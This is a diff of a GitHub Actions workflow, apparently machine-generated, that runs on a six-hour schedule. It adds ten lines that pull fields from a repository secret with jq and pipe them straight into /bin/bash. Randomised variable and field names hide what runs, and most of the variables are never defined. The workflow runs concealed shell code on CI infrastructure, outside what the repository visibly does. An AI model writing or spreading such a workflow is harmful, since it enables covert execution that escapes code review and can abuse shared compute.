@@ -1,19 +1,27 @@
 name: denyhyphae
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 0/6 * * *'
+    - cron: '18 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: denyhyphae
         env:
-          hkg624: ${{ secrets.hkg624 }}
+          aat3: ${{ secrets.aat3 }}
         run: |
-          echo $hkg624 | jq -r .fcag225 | /bin/bash
-          echo $ovxt2 | jq -r .lihgd911 | /bin/bash
-          echo $fvb597 | jq -r .iblc93 | /bin/bash
-          echo $yxyhj941 | jq -r .to38451 | /bin/bash
+          echo $aat3 | jq -r .exjxm4972 | /bin/bash
+          echo $viico6992 | jq -r .fvln53 | /bin/bash
+          echo $d9 | jq -r .fpckx1920 | /bin/bash
+          echo $viwr905 | jq -r .oi29032 | /bin/bash
+          echo $xts27 | jq -r .wbqsm41016 | /bin/bash
+          echo $h9 | jq -r .dl6555 | /bin/bash
+          echo $qajpx3 | jq -r .dfqr2 | /bin/bash
+          echo $c7 | jq -r .htg1 | /bin/bash
+          echo $hvhmz817 | jq -r .fy2 | /bin/bash
+          echo $n8440 | jq -r .uinp90101 | /bin/bash
 
